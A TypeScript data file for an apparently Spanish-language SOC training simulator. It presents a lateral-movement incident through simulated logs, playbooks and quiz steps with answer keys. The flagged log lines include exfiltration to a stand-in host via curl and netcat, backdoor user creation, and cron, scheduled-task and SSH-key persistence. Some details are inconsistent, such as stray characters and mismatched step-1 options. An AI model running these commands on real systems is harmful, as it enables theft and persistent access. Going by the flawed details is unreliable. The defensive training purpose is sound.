import type { Scenario } from "./types";

const scenario: Scenario = {
  id: "lateral-movement",
  title: "Movimiento lateral desde workstation comprometida",
  severity: "critical",
  description:
    "Se detectó activity de SMB y WMI desde la workstation de Carlos Ruiz (10.10.3.22) hacia srv-db-01 (10.10.5.20). Carlos no tiene acceso a la base de datos. La workstation muestra signos de compromiso.",
  alertSource: "Zeek SMB + Wazuh Sysmon Rule 7045",
  alertTime: "2026-08-24 16:45:33 UTC",
  logs: [
    { line: 1, timestamp: "Aug 24 16:30:12", source: "srv-db-01 sshd[1801]", message: "Accepted publickey for deploy from 10.10.1.15 port 49822 ssh2", severity: "info", flagged: false },
    { line: 2, timestamp: "Aug 24 16:32:00", source: "srv-db-01 audit.log", message: "EXECVE: uid=1000(deploy) cmd=/usr/bin/systemctl status postgresql", severity: "info", flagged: false },
    { line: 3, timestamp: "Aug 24 16:20:15", source: "srv-web-01 nginx.access", message: "GET /api/health 200 — 10.10.2.44 — Lucía Fernández Dev", severity: "info", flagged: false },
    { line: 4, timestamp: "Aug 24 16:22:30", source: "srv-monitor cron", message: "Health check: srv-db-01 — CPU 8% — RAM 42% — Disk 65%", severity: "info", flagged: false },
    { line: 5, timestamp: "Aug 24 16:23:45", source: "srv-db-01 postgresql", message: "checkpoint complete: wrote 842 buffers (5.1%)", severity: "info", flagged: false },
    { line: 6, timestamp: "Aug 24 16:25:00", source: "srv-web-01 sshd[22501]", message: "Accepted publickey for sofia from 10.10.3.10 port 49701 ssh2", severity: "info", flagged: false },
    { line: 7, timestamp: "Aug 24 16:26:10", source: "srv-web-01 nginx.access", message: "POST /api/payments/process 201 — 10.10.3.10 — Sofía Ramírez Ops", severity: "info", flagged: false },
    { line: 8, timestamp: "Aug 24 16:27:00", source: "srv-db-01 crond", message: "CMD (/usr/local/bin/pg_backup.sh) — (root)", severity: "info", flagged: false },
    { line: 9, timestamp: "Aug 24 16:28:30", source: "srv-monitor cron", message: "Metric aggregation: 9,841 events — avg latency 11ms", severity: "info", flagged: false },
    { line: 10, timestamp: "Aug 24 16:29:45", source: "srv-web-01 node.app", message: "Queue processor: 156 jobs completed, 28 pending", severity: "info", flagged: false },
    { line: 11, timestamp: "Aug 24 16:35:44", source: "ws-carlos-01 sysmon", message: "ProcessCreate: powershell.exe -enc SQBmACgAJABj... (base64 encoded command)", severity: "critical", flagged: true },
    { line: 12, timestamp: "Aug 24 16:35:48", source: "ws-carlos-01 sysmon", message: "NetworkConnection: powershell.exe → 10.10.5.20:445 (SMB)", severity: "critical", flagged: true },
    { line: 13, timestamp: "Aug 24 16:36:02", source: "ws-carlos-01 sysmon", message: "NetworkConnection: powershell.exe → 10.10.5.20:135 (WMI/RPC)", severity: "critical", flagged: true },
    { line: 14, timestamp: "Aug 24 16:36:15", source: "srv-db-01 zeek.smb", message: "Mapping: ws-carlos-01 (10.10.3.22) → srv-db-01 IPC$ — Tree Connect", severity: "warning", flagged: true },
    { line: 15, timestamp: "Aug 24 16:36:20", source: "srv-db-01 zeek.smb", message: "Mapping: ws-carlos-01 (10.10.3.22) → srv-db-01 postgres — Tree Connect", severity: "critical", flagged: true },
    { line: 16, timestamp: "Aug 24 16:36:30", source: "srv-db-01 audit.log", message: "EXECVE: uid=0(cmd=/opt/scripts/backup_db.sh — se ejecutó desde SHARE remoto)", severity: "critical", flagged: true },
    { line: 17, timestamp: "Aug 24 16:37:00", source: "srv-monitor alert", message: "srv-db-01: CPU spike 98% — dump de PostgreSQL en curso — proceso syslog.pid desde 10.10.3.22", severity: "critical", flagged: true },
    { line: 18, timestamp: "Aug 24 16:37:30", source: "ws-carlos-01 sysmon", message: "FileCreate: C:\\Users\\carlos\\Desktop\\exfil.zip (tamaño: 847MB)", severity: "critical", flagged: true },
    { line: 19, timestamp: "Aug 24 16:38:00", source: "ws-carlos-01 sysmon", message: "NetworkConnection: powershell.exe → 203.0.113.50:443 (HTTPS externo)", severity: "critical", flagged: true },
    { line: 20, timestamp: "Aug 24 16:38:15", source: "ws-carlos-01 sysmon", message: "ProcessCreate: cmd.exe /c net user svc-backup P@ssw0rd123 /add", severity: "critical", flagged: true },
    { line: 21, timestamp: "Aug 24 16:38:25", source: "ws-carlos-01 sysmon", message: "ProcessCreate: cmd.exe /c net localgroup administrators svc-backup /add", severity: "critical", flagged: true },
    { line: 22, timestamp: "Aug 24 16:38:40", source: "srv-db-01 zeek.smb", message: "Mapping: ws-carlos-01 (10.10.3.22) → srv-db-01 C$ — Tree Connect", severity: "critical", flagged: true },
    { line: 23, timestamp: "Aug 24 16:38:55", source: "ws-carlos-01 sysmon", message: "FileCreate: C:\\Users\\carlos\\AppData\\Temp\\payload.dll (tamaño: 245KB)", severity: "critical", flagged: true },
    { line: 24, timestamp: "Aug 24 16:39:10", source: "srv-db-01 audit.log", message: "EXECVE: uid=0(cmd=/bin/bash -c 'curl -s http://203.0.113.50/c2/beacon —校反連続')", severity: "critical", flagged: true },
    { line: 25, timestamp: "Aug 24 16:39:30", source: "ws-carlos-01 sysmon", message: "NetworkConnection: powershell.exe → 10.10.5.10:22 (SSH lateral attempt)", severity: "critical", flagged: true },
    { line: 26, timestamp: "Aug 24 16:40:00", source: "srv-web-01 nginx.access", message: "POST /api/payments/process 200 — 10.10.3.10 — Sofía Ramírez Corp", severity: "info", flagged: false },
    { line: 27, timestamp: "Aug 24 16:42:00", source: "srv-monitor cron", message: "Health check: srv-db-01 — CPU 12% — RAM 45% — Disk 68%", severity: "info", flagged: false },
    { line: 28, timestamp: "Aug 24 16:43:15", source: "srv-web-01 nginx.access", message: "GET /api/orders/history 200 — 10.10.2.44 — Lucía Fernández Dev", severity: "info", flagged: false },
    { line: 29, timestamp: "Aug 24 16:44:00", source: "srv-web-01 node.app", message: "Queue processor: 134 jobs completed, 19 pending", severity: "info", flagged: false },
    { line: 30, timestamp: "Aug 24 16:44:30", source: "srv-db-01 postgresql", message: "LOG: checkpoint complete: wrote 621 buffers (3.8%)", severity: "info", flagged: false },
    { line: 31, timestamp: "Aug 24 16:45:00", source: "srv-web-01 sshd[22520]", message: "Accepted publickey for diego from 10.10.1.20 port 49801 ssh2", severity: "info", flagged: false },
    { line: 32, timestamp: "Aug 24 16:45:30", source: "srv-web-01 nginx.access", message: "GET /dashboard 200 — 10.10.1.20 — Diego López SOC", severity: "info", flagged: false },
    { line: 33, timestamp: "Aug 24 16:46:00", source: "srv-monitor cron", message: "Metric aggregation: 10,203 events — avg latency 13ms", severity: "info", flagged: false },
    { line: 34, timestamp: "Aug 24 16:46:30", source: "srv-web-01 node.app", message: "SSL certificate renewal check — expires in 18 days", severity: "info", flagged: false },
    { line: 35, timestamp: "Aug 24 16:47:00", source: "srv-db-01 sshd[1810]", message: "Accepted publickey for deploy from 10.10.1.15 port 49901 ssh2", severity: "info", flagged: false },
    { line: 36, timestamp: "Aug 24 16:47:30", source: "srv-web-01 nginx.access", message: "POST /api/reports/generate 202 — 10.10.1.15 — Martín González Admin", severity: "info", flagged: false },
    { line: 37, timestamp: "Aug 24 16:48:00", source: "srv-web-01 kernel", message: "[UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.10.1.10 PROTO=TCP SPT=2222 DPT=22", severity: "info", flagged: false },
    { line: 38, timestamp: "Aug 24 16:48:30", source: "srv-db-01 audit.log", message: "EXECVE: uid=1000(deploy) cmd=/usr/bin/pg_dump -U app_user production_db", severity: "info", flagged: false },
    { line: 39, timestamp: "Aug 24 16:49:00", source: "srv-web-01 node.app", message: "Cache hit ratio: 91.7% — Redis memory: 312MB/512MB", severity: "info", flagged: false },
    { line: 40, timestamp: "Aug 24 16:49:30", source: "srv-web-01 nginx.access", message: "GET /api/products 200 — 10.10.3.22 — Carlos Ruiz Corp", severity: "info", flagged: false },
    { line: 41, timestamp: "Aug 24 16:50:00", source: "ws-carlos-01 sysmon", message: "ScheduledTaskCreate: schtasks /create /tn UpdateService /tr C:\\Users\\carlos\\AppData\\Temp\\payload.dll /sc daily /st 03:00", severity: "critical", flagged: true },
    { line: 42, timestamp: "Aug 24 16:50:15", source: "srv-db-01 audit.log", message: "EXECVE: uid=0(cmd=/bin/bash -c 'crontab -l — new entry: 0 3 * * * /opt/.hidden/c2_beacon.sh')", severity: "critical", flagged: true },
    { line: 43, timestamp: "Aug 24 16:50:30", source: "ws-carlos-01 sysmon", message: "FileCreate: C:\\Users\\carlos\\AppData\\Local\\Temp\\svchost.exe (tamaño: 1.2MB)", severity: "critical", flagged: true },
    { line: 44, timestamp: "Aug 24 16:50:45", source: "srv-db-01 zeek.smb", message: "Mapping: ws-carlos-01 (10.10.3.22) → srv-db-01 postgres — Write (backup_db.sh overwritten)", severity: "critical", flagged: true },
    { line: 45, timestamp: "Aug 24 16:51:00", source: "ws-carlos-01 sysmon", message: "NetworkConnection: svchost.exe → 203.0.113.50:443 (HTTPS C2 callback)", severity: "critical", flagged: true },
    { line: 46, timestamp: "Aug 24 16:51:15", source: "srv-db-01 audit.log", message: "EXECVE: uid=0(cmd=/bin/bash -c 'cat /etc/passwd | nc 203.0.113.50 9999')", severity: "critical", flagged: true },
    { line: 47, timestamp: "Aug 24 16:51:30", source: "ws-carlos-01 sysmon", message: "ProcessCreate: powershell.exe -enc SQBmACgAJABj... (secondary payload — keylogger)", severity: "critical", flagged: true },
    { line: 48, timestamp: "Aug 24 16:51:45", source: "srv-db-01 zeek.smb", message: "Mapping: ws-carlos-01 (10.10.3.22) → srv-db-01 D$ — Tree Connect", severity: "critical", flagged: true },
    { line: 49, timestamp: "Aug 24 16:52:00", source: "ws-carlos-01 sysmon", message: "FileCreate: C:\\Users\\carlos\\.ssh\\authorized_keys (SSH key persistence)", severity: "critical", flagged: true },
    { line: 50, timestamp: "Aug 24 16:52:15", source: "srv-db-01 audit.log", message: "EXECVE: uid=0(cmd=/bin/bash -c 'echo ssh-rsa AAAA...attacker_key... >> /root/.ssh/authorized_keys')", severity: "critical", flagged: true },
    { line: 51, timestamp: "Aug 24 16:52:30", source: "ws-carlos-01 sysmon", message: "NetworkConnection: powershell.exe → 10.10.1.30:443 (lateral recon — grafana server)", severity: "critical", flagged: true },
    { line: 52, timestamp: "Aug 24 16:52:45", source: "srv-db-01 zeek.smb", message: "Mapping: ws-carlos-01 (10.10.3.22) → srv-db-01 admin — Tree Connect", severity: "critical", flagged: true },
    { line: 53, timestamp: "Aug 24 16:53:00", source: "ws-carlos-01 sysmon", message: "FileCreate: C:\\Users\\carlos\\Desktop\\enum_results.txt (enumeration output)", severity: "critical", flagged: true },
    { line: 54, timestamp: "Aug 24 16:53:15", source: "srv-db-01 audit.log", message: "EXECVE: uid=0(cmd=/bin/bash -c 'find / -perm -4000 -type f 2>/dev/null')", severity: "critical", flagged: true },
    { line: 55, timestamp: "Aug 24 16:53:30", source: "ws-carlos-01 sysmon", message: "NetworkConnection: powershell.exe → 203.0.113.50:8443 (C2 data upload — enum results)", severity: "critical", flagged: true },
  ],
  playbook: [
    {
      id: "PB-LAT-001",
      title: "Movimiento Lateral — Protocolo de respuesta",
      category: "Compromiso de estación de trabajo",
      content:
        "1. Aislar la workstation comprometida de la red ( desconectar del switch / quarantinar VLAN)\n2. Identificar alcance: ¿a qué servidores accedió? ¿qué datos expuso?\n3. BloquearIP deC2externo en firewall perimetral\n4. Revocar todas las sesiones activas del usuario afectado\n5. Obtener imagen forense de la workstation antes de apagarla\n6. Resetear credenciales de TODOS los usuarios que tengan acceso a los servidores tocados\n7. Revisar si hay persistencia en srv-db-01 (backdoors, cron jobs, usuarios CREADOS)\n8. Notificar a DPO y legal si hay datos de clientes comprometidos\n9. Escalar a management si hay impacto en servicios de pago",
    },
    {
      id: "PB-IR-002",
      title: "Criterios de escalamiento — Niveles de impacto",
      category: "Escalamiento",
      content:
        "NIVEL 1 (L2): Workstation comprometida sin acceso a servidores críticos\nNIVEL 2 (L3): Movimiento lateral a servidores internos\nNIVEL 3 (CISO): Exfiltración de datos de clientes / impacto en servicios de pago\nNIVEL 4 (Legal/DPO): Notificación regulatoria obligatoria (PDPA, GDPR, etc.)",
    },
  ],
  steps: [
    {
      id: "identify",
      title: "Paso 1 — Identificar los logs relevantes",
      description:
        "Revisá el log completo. ¿Cuáles líneas son parte del incidente de movimiento lateral?",
      hint: "Mirá las conexiones SMB, WMI, el dump de la DB, y la exfiltración.",
      options: [
        {
          id: "a",
          label:
            "Reasignar el caso a Carlos para que revise su propia workstation",
          correct: false,
          explanation:
            "Carlos es el usuario comprometido. No podés dejar que el sospechoso investigue su propia estación de trabajo — destruiría evidencia, directa o indirectamente.",
          consequence:
            "En un SOC real, permitir que el usuario afectado manipule la máquina comprometida destruye artefactos forenses críticos: logs temporal, archivos del malware, y registros de conexiones. El caso queda sin evidencia.",
        },
        {
          id: "b",
          label:
            "Aislar la workstation de la red y apagarla inmediatamente para cortar la conexión",
          correct: false,
          explanation:
            "Apagar la máquina destruye la evidencia volátil en memoria RAM: el keylogger activo, las conexiones C2 abiertas, las credenciales robadas en memoria, y los procesos maliciosos. Se necesita imagen forense de RAM antes de apagar.",
          consequence:
            "En un SOC real, apagar sin imagen forense borra el estado del malware en tiempo real. Sin la memoria, no podés determinar qué datos se capturaron ni qué conexiones estaban activas.",
        },
        {
          id: "c",
          label:
            "Notificar al equipo de Legal antes de hacer cualquier contención",
          correct: false,
          explanation:
            "La contención es PRIORITAD. Legal puede ser notificado después. Mientras Legal revisa el caso, el atacante sigue operando: exfiltrando datos, instalando persistencia, y moviéndose a otros servidores.",
          consequence:
            "En un SOC real, priorizar a Legal sobre la contención resulta en exfiltración continua. Cada minuto de demora = más datos de clientes comprometidos y más backdoors instalados.",
        },
        {
          id: "d",
          label:
            "Líneas 11-25 y 41-55 (desde powershell.exe hasta la exfiltración y persistencia)",
          correct: true,
          explanation:
            "Correcto. La secuencia completa es: PowerShell con encoded command → conexiones SMB/WMI → mapeo de shares → ejecución de script → dump de DB → creación de zip → exfiltración HTTPS → creación de usuario → persistencia (cron, scheduled tasks, SSH keys) → más exfiltración. Las líneas normales son activity legítima.",
        },
      ],
    },
    {
      id: "assign",
      title: "Paso 2 — Asignar el incidente",
      description:
        "¿Quién debería responder a este incidente? Considerá que hay compromiso de workstation Y movimiento lateral a srv-db-01.",
      hint: "Esto ya no es un caso para SOC L2. Pensa en el nivel de escalamiento.",
      options: [
        {
          id: "a",
          label:
            "Martín González (SysAdmin) — que revise el servidor directamente desde su terminal",
          correct: false,
          explanation:
            "Martín no es parte del equipo de respuesta a incidentes. Su intervención sin protocolo puede alterar logs, contaminar evidencia forense, y no seguir la cadena de custodia requerida para escalamiento legal.",
          consequence:
            "En un SOC real, un SysAdmin actuando sin coordinación con SOC puede borrar logs relevantes, reiniciar servicios que preservan estado del ataque, y comprometer la admisibilidad de evidencia en procedimientos legales.",
        },
        {
          id: "b",
          label:
            "Diego López (SOC L2) para investigación + Ana Martínez (DevOps) para contención + escalamiento a CISO por impacto nivel 3",
          correct: true,
          explanation:
            "Correcto. El protocolo de escalamiento indica NIVEL 3 cuando hay exfiltración de datos de clientes e impacto en servicios de pago. Diego investiga, Ana contiene, y el CISO debe ser notificado por el nivel de impacto.",
        },
        {
          id: "c",
          label:
            "Automatizar la contención con un playbook ejecutable que aislar y bloquee todo simultáneamente",
          correct: false,
          explanation:
            "No existe playbook automatizado para este escenario (solo hay 2 playbooks registrados y ninguno es ejecutable). La automatización sin validación humana puede aislar sistemas legítimos o cortar servicios de pago activos.",
          consequence:
            "En un SOC real, ejecutar automatización de contención sin revisión manual puede desconectar srv-web-01 del procesamiento de pagos, causando pérdida de transacciones en curso y daño financiero mayor al incidente original.",
        },
        {
          id: "d",
          label:
            "Sofía Ramírez (Gerente de Ops) — que escale a Legal primero para evaluar obligaciones regulatorias",
          correct: false,
          explanation:
            "Legal es parte del escalamiento posterior, no del proceso de contención. Mientras Legal revisa obligaciones regulatorias, el atacante sigue exfiltrando datos e instalando persistencia en la red.",
          consequence:
            "En un SOC real, detener la contención para esperar dictamen legal resulta en más datos comprometidos. El DPO puede ser notificado en paralelo, pero la contención técnica no puede esperar.",
        },
      ],
    },
    {
      id: "playbook",
      title: "Paso 3 — Consultar el playbook",
      description:
        "Según el PB-LAT-001, ¿cuál es la PRIMERA acción de contención?",
      hint: "Pensá en qué hacer con la máquina que está generando el ataque.",
      options: [
        {
          id: "a",
          label:
            "Aislar la workstation de la red (desconectar del switch / quarantinar VLAN)",
          correct: true,
          explanation:
            "Correcto. El primer paso es aislar la máquina de la red para cortar el movimiento lateral sin destruir evidencia. Se desconecta del switch o se mueve a una VLAN de quarantaine. La imagen forense se toma después.",
        },
        {
          id: "b",
          label:
            "Resetear credenciales de todos los usuarios del dominio antes de hacer anything else",
          correct: false,
          explanation:
            "Resetear TODAS las credenciales del dominio es desproporcionado y paralizante. Primero se aisla la máquina comprometida para cortar el acceso activo. Las credenciales se resetean selectivamente después de identificar cuáles están comprometidas.",
          consequence:
            "En un SOC real, resetear todas las credenciales del dominio sin aislar primero detiene toda la operación de la empresa. Cientos de usuarios, servicios automatizados, y aplicaciones quedan sin acceso simultáneamente.",
        },
        {
          id: "c",
          label:
            "Esperar la aprobación del CISO antes de ejecutar cualquier acción de contención",
          correct: false,
          explanation:
            "El CISO debe ser notificado, pero la contención no requiere su aprobación explícita. El SOC tiene autoridad para contener incidentes activos. Esperar aprobación da tiempo al atacante para exfiltrar más datos.",
          consequence:
            "En un SOC real, esperar aprobación ejecutiva para contención básica resulta en demoras de horas. Mientras el CISO revisa el caso, el atacante completa la exfiltración y refuerza la persistencia.",
        },
        {
          id: "d",
          label:
            "Desplegar un agente de EDR en ws-carlos-01 para monitorear el comportamiento del malware",
          correct: false,
          explanation:
            "Desplegar software en una máquina comprometida es arriesgado: el malware puede detectar el agente, evadirlo, o usarlo como vector adicional. Primero se aisla, luego se forensea, y la herramienta de monitoreo se instala en un entorno controlado.",
          consequence:
            "En un SOC real, instalar un agente EDR en una workstation comprometida puede alertar al atacante, provocar que destruya evidencia, o incluso usar el agente como canal de C2 alternativo.",
        },
      ],
    },
    {
      id: "classify",
      title: "Paso 4 — Clasificar la alerta",
      description:
        "¿Cuál es la clasificación correcta de este incidente?",
      hint: "Compromiso de workstation + movimiento lateral + dump de DB + exfiltración externa.",
      options: [
        {
          id: "a",
          label:
            "Incidente de severidad media — movimiento lateral controlado sin impacto en datos",
          correct: false,
          explanation:
            "El atacante hizo dump de PostgreSQL completo, creó un zip de 847MB, y lo exfiltró por HTTPS a una IP externa. Además instaló persistencia con usuarios backdoor, cron jobs, y SSH keys. Esto es severidad CRÍTICA, no media.",
          consequence:
            "En un SOC real, clasificar como media cuando hay exfiltración confirmada resulta en respuesta insuficiente: no se escala a CISO, no se notifica a DPO, y la contención no es prioritaria. Los datos de clientes siguen comprometidos.",
        },
        {
          id: "b",
          label:
            "Actividad sospechosa que requiere monitoreo — no hay evidencia de compromiso confirmado",
          correct: false,
          explanation:
            "La evidencia es concluyente: PowerShell encoded + SMB/WMI lateral + dump PostgreSQL + exfiltración HTTPS + creación de usuarios + persistencia. Cada paso es un indicador de compromiso confirmado, no sospecha.",
          consequence:
            "En un SOC real, clasificar como 'requiere monitoreo' cuando hay exfiltración activa permite que el atacante complete la operación. Monitorear sin contener esobservar el robo en tiempo real sin intervenir.",
        },
        {
          id: "c",
          label:
            "Positivo verdadero — Compromiso de workstation con movimiento lateral y exfiltración confirmada",
          correct: true,
          explanation:
            "Correcto. La evidencia es abrumadora: PowerShell encoded → SMB/WMI lateral → dump PostgreSQL → exfiltración HTTPS → creación de usuarios → persistencia. Cada paso es un indicador de compromiso que se encadena en un ataque completo.",
        },
        {
          id: "d",
          label:
            "Falso positivo — Carlos está ejecutando una migración de base de datos autorizada",
          correct: false,
          explanation:
            "Las migraciones autorizadas usan herramientas oficiales (pg_dump con credenciales de servicio), se ejecutan desde servidores de deploy, no desde workstations, y no usan PowerShell encoded ni crean zips de 847MB para subir a IPs externas.",
          consequence:
            "En un SOC real, aceptar la excusa de 'migración' cuando hay PowerShell encoded + IP externa + usuarios backdoor creados permite que el atacante siga operando bajo la cobertura de una actividad supuestamente legítima.",
        },
      ],
    },
    {
      id: "writeup",
      title: "Paso 5 — Redacción del reporte",
      description:
        "Escribí el reporte. Este es un incidente nivel 3 — necesitás un reporte completo.",
      hint: "Incluí: timeline, IOC, impacto, y acciones con prioridad.",
      options: [
        {
          id: "a",
          label:
            "La computadora de Carlos fue comprometida. Hackearon la base de datos. Urge.",
          correct: false,
          explanation:
            "Sin datos técnicos, sin timeline, sin IOC, sin acciones concretas. Un reporte así genera más preguntas que respuestas.",
          consequence:
            "En un SOC real, un reporte sin IOC no permite bloquear indicadores de compromiso en otros sistemas. Sin timeline, no se puede determinar cuándo empezó el ataque ni qué datos se perdieron en cada fase.",
        },
        {
          id: "b",
          label:
            "Se movieron cosas por la red y alguien robó datos. Hay que cambiar todas las contraseñas.",
          correct: false,
          explanation:
            "Sin specifics, sin classification de impacto, sin IOC. 'Cambiar todas las contraseñas' no es una acción de contención — es remediación genérica que no aborda la raíz del problema.",
          consequence:
            "En un SOC real, \"cambiar todas las contraseñas\" sin identificar qué credenciales específicamente están comprometidas es inútil: si no cambias la que usa el malware, el atacante sigue teniendo acceso.",
        },
        {
          id: "c",
          label:
            "Reporte de incidente: Se detectó movimiento lateral desde workstation de Carlos. Se requiere escalamiento a CISO y notificación a Legal por posible fuga de datos. Se recomienda revisar logs de srv-db-01.",
          correct: false,
          explanation:
            "El reporte menciona el incidente pero carece de evidencia técnica concreta: no incluye IPs, timestamps específicos, hashes, ni la secuencia de eventos. Sin IOC no se puede bloquear al atacante en otros sistemas.",
          consequence:
            "En un SOC real, un reporte sin datos técnicos no permite al equipo de contención ejecutar acciones inmediatas. No saben qué IP bloquear, qué usuario desactivar, ni qué servidor aislar.",
        },
        {
          id: "d",
          label:
            "Compromiso de ws-carlos-01 (10.10.3.22) con movimiento lateral a srv-db-01 (10.10.5.20). Timeline: 16:35 PowerShell encoded → 16:36 SMB/WMI lateral → 16:37 dump PostgreSQL + exfiltración vía HTTPS a 203.0.113.50. IOC: SHA256 del payload PowerShell, IP C2 (203.0.113.50), dominio evil-cdn.com. Impacto NIVEL 3: posible fuga de datos de clientes de pagos. Acciones ejecutadas: workstation aislada, IP C2 bloqueada, sesiones de Carlos revocadas. Acciones pendientes: imagen forense, forense de srv-db-01, notificación DPO, escalamiento CISO.",
          correct: true,
          explanation:
            "Reporte completo de nivel 3: TIMELINE preciso (minuto a minuto), IOC (IPs, hashes), IMPACTO clasificado, ACCIONES ejecutadas vs pendientes. Este formato permite a cualquier persona entender el incidente y tomar decisiones informadas.",
        },
      ],
    },
    {
      id: "return",
      title: "Paso 6 — Volver al panel",
      description:
        "Incidente nivel 3 documentado y escalado. ¿Qué sigue en tu flujo de trabajo?",
      hint: "Pensá en qué queda pendiente mientras otros equipos ejecutan.",
      options: [
        {
          id: "a",
          label:
            "Volver al panel de logs para monitorear si hay más activity maliciosa de otras IPs o servidores, mientras el equipo ejecuta la contención",
          correct: true,
          explanation:
            "Correcto. Tu rol como SOC analyst es vigilancia continua. Mientras DevOps contiene y el forense investiga, vos volvés al panel para: detectar si hay más workstations comprometidas, identificar si el atacante tiene otros puntos de acceso, y monitorear si la contención está funcionando.",
        },
        {
          id: "b",
          label:
            "Cerrar el caso — ya está todo documentado y escalado",
          correct: false,
          explanation:
            "Un incidente nivel 3 nunca se cierra con solo documentar. Hay que seguir monitoreando: ¿hay más workstations comprometidas? ¿el atacante tiene persistencia? ¿hay más exfiltración en curso?",
          consequence:
            "En un SOC real, cerrar un incidente nivel 3 sin verificar remediación completa es negligencia. El atacante podría tener backdoors en srv-db-01, acceso SSH persistente, y cron jobs que recomprometan el sistema cada 24 horas.",
        },
        {
          id: "c",
          label:
            "Ir a la workstation de Carlos a revisarla personalmente",
          correct: false,
          explanation:
            "Como SOC analyst, no deberías manipular evidencia físicamente. Eso es trabajo del equipo forense. Tu rol es análisis de logs, clasificación, y monitoreo continuo.",
          consequence:
            "En un SOC real, tocar la workstation físicamente sin protocolo forense puede alterar timestamps de archivos, contaminar evidencia de huellas digitales, y comprometer la cadena de custodia para uso legal.",
        },
        {
          id: "d",
          label:
            "Esperar a que el equipo forense complete su reporte antes de volver a monitorear",
          correct: false,
          explanation:
            "El análisis forense toma horas o días. Mientras esperás, el atacante puede estar instalando persistencia en otros sistemas, moviéndose lateralmente a nuevos servidores, o exfiltrando datos adicionales.",
          consequence:
            "En un SOC real, pausar el monitoreo mientras el forense trabaja crea una ventana donde el atacante opera sin vigilancia. El SOC debe mantener monitoreo continuo independientemente del estado del forense.",
        },
      ],
    },
  ],
  summary:
    "Compromiso de ws-carlos-01 (Analista Financiero) con movimiento lateral a srv-db-01 vía SMB/WMI. El atacante ejecutó dump de PostgreSQL, creó zip de 847MB y exfiltró vía HTTPS a 203.0.113.50. Impacto NIVEL 3: posible fuga de datos financieros y de clientes. Clasificación: POSITIVO VERDADERO — Compromiso completo con exfiltración.",
};

export default scenario;
